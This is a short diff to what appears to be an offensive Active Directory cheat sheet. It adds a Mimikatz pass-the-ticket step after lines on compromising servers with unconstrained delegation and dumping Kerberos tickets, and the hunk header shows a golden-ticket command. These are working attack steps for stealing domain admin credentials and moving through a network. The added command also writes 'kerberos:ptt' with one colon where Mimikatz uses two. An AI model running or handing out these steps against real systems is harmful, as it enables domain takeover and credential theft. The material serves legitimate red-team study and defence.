@@ -650,3 +650,5 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
 - Compromise the server(s) where Unconstrained delegation is enabled.
 - Run following command on it to check if any DA token is available
   - `Invoke-Mimikatz -Command '"sekurlsa::tickets"'` 
+- Get an access
+  - `Invoke-Mimikatz -Command '"kerberos:ptt <ticket>"'`
